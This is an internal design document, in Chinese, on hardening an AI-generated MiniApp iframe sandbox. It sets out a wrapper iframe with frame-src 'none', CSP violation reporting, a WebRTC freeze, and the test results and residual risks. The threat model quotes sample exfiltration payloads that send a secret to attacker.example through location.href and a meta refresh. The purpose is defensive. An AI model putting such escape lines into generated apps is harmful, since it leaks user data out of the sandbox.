# MiniApp 沙箱加固：自导航逃逸与桥接管

> 状态：P0 + P1 + WebRTC 冻结已实施（2026-11-12）
>
> **当前实现状态以 [MiniApp 功能与架构现状](./miniapp-overview.md) 为准；本文保留威胁模型、实测证据与残余风险。**
>
> 范围：`feature/miniapp-capabilities` 之后的沙箱加固（P0 导航边界，P1 违规上报与服务端能力校验，WebRTC 冻结）。
>
> 相关：[MCP Apps 规范的 sandbox proxy](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)、
> [MCP Inspector 安全公告 GHSA-h9j8-vj8g-v3gg](https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-h9j8-vj8g-v3gg)。

---

## 1. 问题

MiniApp 的 `app.html` 由 Agent 生成，属于不可信代码。旧实现把它直接放进
`sandbox="allow-scripts"` 的 `srcdoc` iframe，并注入 `APP_CSP`：

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
img-src data: blob:; font-src data:; media-src data: blob:;
connect-src 'none'; base-uri 'none'; form-action 'none'
```

这套 CSP 挡住了远程脚本、图片、`fetch`、表单提交，但**不覆盖导航**。App 只要执行：

```js
location.href = "https://attacker.example/?d=" + encodeURIComponent(secret);
```

或：

```html
<meta http-equiv="refresh" content="0;url=https://attacker.example/">
```

就能离开 srcdoc。关键在于：

1. sandbox flags **跨导航保留**，新页面仍是 opaque origin（`origin === "null"`）；
2. 宿主的检查是 `event.source === iframe.contentWindow`，导航后仍然成立；
3. 宿主回复用 `postMessage(..., "*")`，攻击页能收到。

于是攻击页可以继续调用 `rows` 读取全部行数据，再自己 `fetch` 出去；也可以调用
`append` 篡改数据、`generate` 消耗模型额度。

### 实测证据

用真实 Chromium + 本地攻击服务器复现（`tests/integration/test_miniapp_sandbox.py`）：

| 拓扑 | 逃逸方式 | 是否到达攻击服务器 |
|---|---|---|
| 旧实现（单层 srcdoc） | `location.href` | **是**，URL 携带 `SECRET-ROW-1` |
| 旧实现（单层 srcdoc） | meta refresh | **是** |
| wrapper（`frame-src 'none'`） | `location.href` | 否 |
| wrapper（`frame-src 'none'`） | meta refresh | 否 |
| 对照：wrapper + `frame-src http:` | `location.href` | **是** |

最后一行是因果验证：放行 `frame-src` 后泄漏恢复，证明起作用的是该指令，而不是
wrapper 结构本身。

---

## 2. 修复

### 2.1 双层 wrapper

App 不再直接放进宿主页面的 iframe，而是多包一层**固定、由 Octop 自己编写的**
wrapper 文档：

```
Dashboard / 公开宿主页
  └─ outer iframe  sandbox="allow-scripts"  srcdoc = wrapper（固定文档）
       └─ inner iframe  sandbox="allow-scripts"  srcdoc = app.html
```

wrapper 的 CSP 为：

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
frame-src 'none'; object-src 'none'
```

原理：**子 frame 自身的导航由 embedder 的 `frame-src` 管辖**。wrapper 声明
`frame-src 'none'`，浏览器因此拒绝 inner frame 的任何后续导航，App 的
`location.href` / meta refresh 都走不出去。宿主页面自己的 `frame-src` 不受影响
（它仍要加载 wrapper、游戏页等）。

wrapper 同时负责双向转发消息：外层 frame 是 opaque origin，宿主无法直接访问
inner frame 的 `contentWindow`，只能与 wrapper 通信。

### 2.2 二次 load 熔断

wrapper 监听 inner frame 的 `load`：

- 第 1 次是 srcdoc 初始加载；
- 第 2 次及以后视为逃逸，移除 inner frame、停止转发、向宿主发送
  `{source:"octop-app-host", type:"escaped"}`。

宿主收到后停止代调并显示“该小程序试图离开沙箱，已被停止”。

注意：**立即导航**可能被 `frame-src` 在产生第二个文档之前拦下，不会触发第二次
`load`；这时熔断没有事件可观察，但数据也没有离开。安全性由 `frame-src` 保证，
熔断是纵深防御。

### 2.3 CSP 违规上报（P1）

CSP 已经拦住远程请求，但"有人尝试"本身值得记录。链路：

```
App 页面 securitypolicyviolation
  → APP_SDK postMessage {source:"octop-app", type:"violation"}
  → wrapper 原样转发
  → dashboard 桥（每页面最多 20 条/分钟）
  → POST /api/apps/{app_id}/security-events
  → view ACL + 每 app+user 30 条/分钟
  → METRICS.light_app_csp_violation_total
  → audit_log action=light_app.csp_violation
```

同一个端点也接收 `kind: "sandbox_integrity"`（SDK 不变量自检失败）：
`METRICS.light_app_sandbox_integrity_total`，审计 `light_app.sandbox_integrity`。

- `blocked_uri` 在写入审计前去掉 query 和 fragment：被拦的 URL 可能正携带页面想外带的数据，审计只保留 scheme/host/path（`data:`/`blob:`/`javascript:` 只保留 scheme）。
- 上报是 fire-and-forget：失败不影响页面。
- 公开链接页**暂不上报**（没有登录态、也没有对应的公开端点）；后续可加 token-scoped 的公开上报端点。

### 2.4 服务端能力校验（P1）

能力清单不能只靠前端桥。现有两类有外部副作用的入口已经在服务端强校验：

- `POST /api/apps/{id}/generate` → `service.require_capability(row, CAP_AI_GENERATE)`；
- `POST /api/apps/{id}/game-sessions` → `service.require_capability(row, CAP_GAME_LAUNCH)`。

规则：**任何新增的、会调用外部服务或产生费用的 R2 端点，都必须在服务端先调用
`service.require_capability`，再做 I/O**；不能只依赖 `bridge.ts` 的检查。数据读写
端点（`/rows`、`/assets`）仍以用户 ACL 为准，因为详情页数据面板和页面共用同一组
API，能力位只约束页面代码，不约束用户本人。

### 2.5 WebRTC 冻结

CSP 不覆盖 `RTCPeerConnection`：App 通过桥读到行数据后，可以把它发到任意
STUN/TURN 服务器。WebRTC 冻结在 App 脚本之前执行：

- 把 `RTCPeerConnection`、`webkitRTCPeerConnection`、`mozRTCPeerConnection`、
  `RTCDataChannel` 定义成 **window 和 Window.prototype 上的不可配置 `undefined`**；
  `delete` 和原型查找都拿不回来（实测 `delete` 返回 false）；
- 同时冻结 `HTMLIFrameElement`、`HTMLFrameElement`、`HTMLObjectElement`、
  `HTMLEmbedElement`、`Worker`、`SharedWorker`、`WebTransport`、`window.open`
  和 `navigator.serviceWorker`；
- **封堵嵌套 frame**：`document.createElement/createElementNS('iframe'|'frame'|
  'object'|'embed'|'portal')`、`innerHTML`/`outerHTML`/`ShadowRoot.innerHTML`、
  `insertAdjacentHTML`、`append`/`prepend`/`replaceChildren`、
  `document.write/writeln`、`document.execCommand('insertHTML')`、
  `setHTMLUnsafe`/`setHTML`、`Document.parseHTMLUnsafe`、
  `DOMParser.parseFromString`、`Range.createContextualFragment` 都会拒绝 frame
  标记或 frame 节点；
- **MutationObserver 兜底**：观察整个 `document`（不是 `documentElement`，防止
  根节点被替换），解析器或遗漏的 API 插入的 frame/object/embed 会在微任务里被
  移除，`DOMContentLoaded` 再扫一遍；
- **SDK 不变量自检**：每次桥请求前检查 RTC 全局是否仍为 `undefined`、文档里是否
  出现 frame；不满足就拒绝请求并上报 `sandbox_integrity`。这是检测，不是阻止
  （App 可以绕过 SDK 直接 `postMessage`）；
- **旧 App 渲染拦截**：写入校验只覆盖新写入；`buildSrcDoc` / `build_app_doc` 对
  已存在且包含 frame 标签的 App 返回安全错误页，不再渲染。静态检查是保守的：
  JS 字符串里出现 `<iframe` 也会被当作 frame 拒绝，这是有意的，避免解析歧义。

Trusted Types 严格模式（`require-trusted-types-for 'script'; trusted-types 'none'`）
会让所有字符串到 DOM 的 sink 抛错，能砍掉一大类未覆盖 API，但会破坏大量依赖
`innerHTML` 的 App，且目前只有 Chromium 系支持；暂不作为默认，留作按应用开启的
严格模式。

为什么必须封 frame：嵌套 `srcdoc` frame 会得到一个**全新的 realm**，里面的
`RTCPeerConnection` 是未冻结的。`frame-src 'none'` 不会阻止初始 `srcdoc`
加载（实测），所以只冻结顶层窗口是不够的。

注入位置：`buildSrcDoc`（dashboard）和 `build_app_doc`（服务端/公开页）都会把
冻结脚本放在**所有 App 脚本之前**，并保留原 `<html>` 的 `lang`/`class` 等属性；
即使 App 把 `<script>` 写在 `<head>` 之前，冻结也先执行。

边界说明：这是浏览器侧的纵深防御，不是形式化边界。脚本顺序、浏览器 bug 或
未覆盖的 DOM API 仍可能绕过；需要完整隔离时走独立内容域或服务端浏览器。

### 2.6 其他收紧

| 改动 | 原因 |
|---|---|
| `APP_CSP` 增加 `frame-src 'none'`、`object-src 'none'` | 禁止 App 嵌入嵌套 frame / 插件对象 |
| 公开宿主页补 `event.source` 校验 | 旧实现任何窗口都能驱动只读桥 |
| `isMethodAllowed` 对未知方法返回 `false` | 旧实现 fail-open；未来新增桥方法会默认放行 |
| `find_external_refs` 增加 `meta refresh`、`location.href/assign/replace`、`window.open`、`RTCPeerConnection` | 把逃逸问题提前到写入阶段，给 Agent 明确修复提示（不是安全边界） |
| 三处桥统一为 `bridge.ts` | `MiniAppFrame`、`Detail`、公开页不再各自维护一份分发逻辑 |

---

## 3. 实现位置

| 关注点 | 文件 |
|---|---|
| 前端 wrapper 文档 | `dashboard/src/components/MiniAppFrame/wrapper.ts` |
| 共享桥 + 能力校验 | `dashboard/src/components/MiniAppFrame/bridge.ts` |
| CSP 常量 | `dashboard/src/components/MiniAppFrame/appCsp.ts` |
| 聊天/看板宿主 | `dashboard/src/components/MiniAppFrame/index.tsx` |
| 详情页宿主 | `dashboard/src/pages/Apps/Detail.tsx` |
| 服务端 wrapper / CSP | `src/octop/infra/apps/sandbox.py` |
| 公开链接宿主页 | `src/octop/api/routers/public_apps.py` |
| 写入时扫描 | `src/octop/infra/apps/models.py` |
| CSP 违规上报端点 | `src/octop/api/routers/apps.py`（`/security-events`） |
| 违规上报限流 | `src/octop/infra/apps/limits.py`（`csp_violation_slot`） |
| 违规 URL 脱敏 | `src/octop/infra/apps/sandbox.py`（`sanitize_blocked_uri`） |
| SDK 违规监听 | `dashboard/src/components/MiniAppFrame/sdk.ts` |

前端与后端各有一份 wrapper 生成器（宿主分别是 React 与服务端渲染），CSP 常量
保持一致，由两边的单测覆盖。

---

## 4. 验证

```bash
# 浏览器回归（真实 Chromium；无浏览器时自动 skip）
# 覆盖：导航逃逸、双向中继、data: 图片、CSP 违规、WebRTC 冻结、嵌套 frame 封堵
uv run pytest tests/integration/test_miniapp_sandbox.py -q

# 后端单测
uv run pytest tests/unit/apps/test_sandbox.py tests/unit/apps/test_models.py \
  tests/unit/apps/test_limits.py -q

# CSP 违规上报 / 服务端能力校验
uv run pytest tests/integration/test_apps_api.py -q -k "security or capability"

# 前端
cd dashboard && NODE_OPTIONS=--max-old-space-size=3072 npx tsc -b
./node_modules/.bin/vitest run src/components/MiniAppFrame src/pages/Apps

# ship bar
make all
```

回归测试自带**对照组**：去掉 wrapper 后必须能观测到泄漏，否则说明测试本身失效。
本次还做了回退验证：把 `frame-src 'none'` 改成 `frame-src http:` 后有三个用例
失败并报出真实泄漏，恢复后全绿。

---

## 5. 残余风险

| 风险 | 现状 | 后续 |
|---|---|---|
| WebRTC | CSP 不覆盖；已在 App 脚本前冻结 RTC 全局并封堵嵌套 frame，但仍属浏览器侧纵深防御，可能被未覆盖的 DOM API 或浏览器 bug 绕过 | 公开/多租户/高安全场景需要独立内容域或服务端浏览器 |
| 未覆盖的 DOM API / 浏览器 bug | 冻结按已知 API 封堵，无法穷举；新 sink 或 CSP/sandbox 绕过可能重新打开一个 realm | 服务端浏览器/VM（网络出站白名单 + 禁用 WebRTC）或 Worker + 受控 VDOM；线上用 `sandbox_integrity` + CSP 上报做检测 |
| CPU / 内存 | srcdoc iframe 与 Dashboard 同 renderer process，死循环仍可卡死页面；sandbox 不是资源边界 | 需要独立 site/process（独立内容域 + OAC）或服务端无头浏览器 |
| 浏览器差异 | `srcdoc` + `frame-src` 继承在历史上有过差异/漏洞（Chromium issue 40053051） | 已用真实 Chromium 回归；Firefox/WebKit 建议在 CI 或本地补跑 |
| 社会工程 | App 仍可在自己的框内画一个假界面 | Host 明确标注沙箱边界；高风险动作继续走用户确认 |
| 公开页 | 已加 wrapper + `event.source`，但公开面本身只读 | 仍然复用同一 wrapper |

**不建议现在上微 VM**：MiniApp 的 HTML 在用户浏览器里渲染，服务端不执行这段
代码；E2B/Firecracker 之类的方案解决的是“服务端执行不可信代码”，与本题错配。
真正需要进程/资源隔离时，优先做独立内容域（Claude Artifacts 的
`claudeusercontent.com` + HTTP 头 CSP + 短签名 URL）。

---

## 6. 与 MCP Apps 的关系

MCP Apps 规范把同样的结构写成 MUST：

- Web host 必须使用不同 origin 的 sandbox proxy；
- 未声明 `frameDomains` 时使用 `frame-src 'none'`；
- 宿主必须校验并代理 View 发来的消息。

本次的 wrapper 就是这套结构的最小实现。未来若支持 MCP Apps 的 `ui://`
资源，wrapper、CSP 构造和能力校验可以直接复用，只需再加一层 JSON-RPC 桥。
